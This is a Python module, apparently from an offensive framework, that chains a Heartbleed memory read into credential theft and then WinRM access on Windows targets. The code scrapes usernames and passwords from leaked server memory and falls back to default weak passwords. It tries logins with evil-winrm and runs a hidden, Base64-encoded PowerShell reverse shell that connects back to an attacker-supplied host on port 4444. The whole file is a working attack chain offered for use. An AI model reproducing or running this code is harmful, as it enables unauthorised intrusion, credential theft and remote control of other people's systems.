import os,sys
project_root = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
lib_path = os.path.join(project_root, "lib")
sys.path.insert(0, lib_path)
import subprocess
import tempfile
import re
import time
import threading
from colorama import Fore,init
init(autoreset=True)
import fcntl
def safe_print(msg):
    with open(sys.stdout.fileno(), 'wb', closefd=False) as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)  # 加锁
        sys.stdout.write(msg + '\n')
        sys.stdout.flush()
        fcntl.flock(fd, fcntl.LOCK_UN)  # 解锁

class Module:
    def __init__(self):
        self.name = "Heartbleed-to-WinRM Attack Chain"
        self.port = 443               # 主要触发端口（HTTPS）
        self.protocol = "tcp"
        self.platform = "windows"
        self.use_msf = False

        # 可调整参数
        self.heartbleed_reads = 10    # 读取内存次数
        self.winrm_port = 5985        # WinRM 默认端口

    def exploit(self, target_ip=None, target_port=443, lhost=None):
        if lhost is None:
            return False, "需要提供 LHOST 用于反弹 Shell"

        safe_print(f"{Fore.GREEN}[*] 启动攻击链：Heartbleed → WinRM 对 {target_ip}")

        # --- 第一步：Heartbleed 信息收集 ---
        dump_file = self._run_heartbleed(target_ip, target_port)
        if not dump_file:
            return False, "Heartbleed 检测失败或目标不存在漏洞"

        # --- 第二步：凭证提取 ---
        credentials = self._extract_credentials(dump_file)
        if not credentials:
            return False, "未能从内存中提取到有效凭证"

        safe_print(f"{Fore.GREEN}[+] 从内存中提取到 {len(credentials)} 组可能的凭证")

        # --- 第三步：WinRM 攻击尝试 ---
        for username, password in credentials:
            safe_print(f"{Fore.GREEN}[*] 尝试 WinRM 登录: {username}:{password}")
            if self._test_winrm_login(target_ip, username, password):
                safe_print(f"{Fore.GREEN}[+] WinRM 登录成功！")
                # 执行反弹 Shell
                return self._execute_winrm_payload(target_ip, username, password, lhost)

        return False, "所有提取到的凭证均无法通过 WinRM 认证"

    # ========== 内部方法 ==========
    def _run_heartbleed(self, target_ip, port):
        """运行 Heartbleed PoC，返回内存转储文件路径"""
        poc_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "heartbleed-poc.py")
        if not os.path.exists(poc_path):
            safe_print("[-] Heartbleed PoC 脚本不存在，请下载至 modules/payloads/")
            return None

        dump_file = tempfile.mktemp(suffix='.bin')
        cmd = ["python3", poc_path, target_ip, "-p", str(port), "-n", str(self.heartbleed_reads), "-f", dump_file]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if "VULNERABLE" in (result.stdout + result.stderr).upper():
                safe_print(f"[+] 目标存在 Heartbleed，内存数据保存至 {dump_file}")
                return dump_file
            else:
                safe_print("[-] 目标未发现 Heartbleed 漏洞")
                return None
        except Exception as e:
            safe_print(f"[-] Heartbleed 执行失败: {e}")
            return None

    def _extract_credentials(self, dump_file):
        """从内存转储中提取可能的用户名密码对"""
        try:
            with open(dump_file, 'rb') as f:
                data = f.read()
        except:
            return []

        # 尝试用常见编码解码
        text = ''
        for encoding in ['utf-8', 'latin-1', 'cp1252']:
            try:
                text = data.decode(encoding, errors='ignore')
                break
            except:
                continue
        if not text:
            return []

        credentials = set()
        # 常见凭证模式
        patterns = [
            r'username[=:\s]+([^\s&]+)',           # username=admin
            r'user[=:\s]+([^\s&]+)',               # user=admin
            r'password[=:\s]+([^\s&]+)',           # password=123456
            r'pass[=:\s]+([^\s&]+)',               # pass=123456
            r'Authorization:\s*Basic\s+(\S+)',     # Basic base64
            r'login[=:\s]+([^\s&]+)',              # login=admin
            r'email[=:\s]+([^\s&]+)',              # email=user@domain.com
        ]

        usernames = []
        passwords = []
        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                if 'Authorization' in pattern:
                    # Base64 解码
                    import base64
                    try:
                        decoded = base64.b64decode(match).decode('utf-8')
                        if ':' in decoded:
                            u, p = decoded.split(':', 1)
                            usernames.append(u)
                            passwords.append(p)
                    except:
                        pass
                else:
                    # 简单启发式：长度在3-20之间的认为是用户名/密码
                    if 3 <= len(match) <= 30:
                        if 'user' in pattern or 'login' in pattern or 'email' in pattern:
                            usernames.append(match)
                        elif 'pass' in pattern:
                            passwords.append(match)

        # 组合用户名和密码
        for u in usernames[:5]:      # 限制数量防止爆破过多
            for p in passwords[:5]:
                credentials.add((u, p))
        # 如果未提取到完整对，添加一些默认弱口令组合
        if not credentials:
            default_users = ['administrator', 'admin', 'user']
            default_passwords = ['P@ssw0rd', 'password', '123456', 'admin']
            for u in default_users:
                for p in default_passwords:
                    credentials.add((u, p))

        return list(credentials)

    def _test_winrm_login(self, target_ip, username, password):
        """使用 evil-winrm 测试登录"""
        cmd = f"evil-winrm -i {target_ip} -u '{username}' -p '{password}' -P {self.winrm_port} < /dev/null"
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            # 成功连接会显示 "Evil-WinRM* PS"
            if "Evil-WinRM" in result.stdout or "PS" in result.stdout:
                return True
        except:
            pass
        return False

    def _execute_winrm_payload(self, target_ip, username, password, lhost):
        """通过 WinRM 执行反弹 Shell 命令"""
        # 使用 PowerShell 反弹 Shell
        ps_payload = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        # 将 payload 编码为 Base64 以避免特殊字符问题
        import base64
        encoded = base64.b64encode(ps_payload.encode('utf_16_le')).decode()
        cmd = f"powershell -NoP -NonI -W Hidden -Enc {encoded}"

        # 通过 evil-winrm 执行
        full_cmd = f"evil-winrm -i {target_ip} -u '{username}' -p '{password}' -P {self.winrm_port} -c '{cmd}'"
        try:
            subprocess.Popen(full_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            safe_print(f"[*] 已在后台启动反弹 Shell 到 {lhost}:4444，请确保监听已开启")
            return True, f"WinRM 攻击链成功，反弹 Shell 已发送"
        except Exception as e:
            return False, f"执行 payload 失败: {e}"
